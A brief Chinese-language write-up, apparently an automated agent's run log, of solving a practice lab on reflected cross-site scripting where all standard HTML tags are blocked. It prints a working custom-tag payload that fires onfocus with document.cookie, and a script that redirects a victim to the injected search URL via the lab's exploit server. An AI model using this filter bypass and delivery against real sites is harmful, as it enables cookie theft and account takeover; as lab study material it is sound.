---
title: lab-html-context-with-all-standard-tags-blocked
---

# lab-html-context-with-all-standard-tags-blocked

arm B 冷实例一次通过：反射点在首页搜索框（GET /?search=），自定义标签直落 h1 文本上下文，交付靠 exploit server 重定向。

- page_read 取 lab_id（35D25A42…54CED）→ range_launch（jar /tmp/cj1.json，reused:false）得实例 0a53003304fcfeb6806c622000280060。
- 载荷：`<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>`；原始响应逐字回显（http_session 的剥 script 提示在此只影响取证观感，不影响落点）。
- DOM 复核（browser_suite goto + eval）：元素存在，attributes 为 `autofocus= tabindex=1 onfocus=alert(document.cookie)`，tabIndex=1。
- 触发判定：page_alert 裸跑 fired=false（`document.hasFocus()===false`，页面自渲染的 autofocus 在后台窗口不生效，非载荷缺陷）；`--click xss` 后 fired=true，alerts=["alert:"]，证明 onfocus 处理器可执行。
- 交付：exploit server（exploit-0a0f00b40478feb0801f61e6011a00ec）POST /（urlIsHttps/responseFile/responseHead/responseBody/formAction=DELIVER_TO_VICTIM）存 302→/deliver-to-victim，再 GET /deliver-to-victim；body 为 `<script>location='<lab>/?search=<URL 编码载荷>'</script>`。
- 判定：交付页 `widgetcontainer-lab-status is-solved` + “Congratulations, you solved the lab!”；banner_verdict 对实例首页 solved:true、solved_class:true。
- 坑：page_alert 首跑 CDP 超时（一次），browser_suite stop 重置后恢复；autofocus 在非聚焦窗口不可达，须用 click/focus 才可自测。
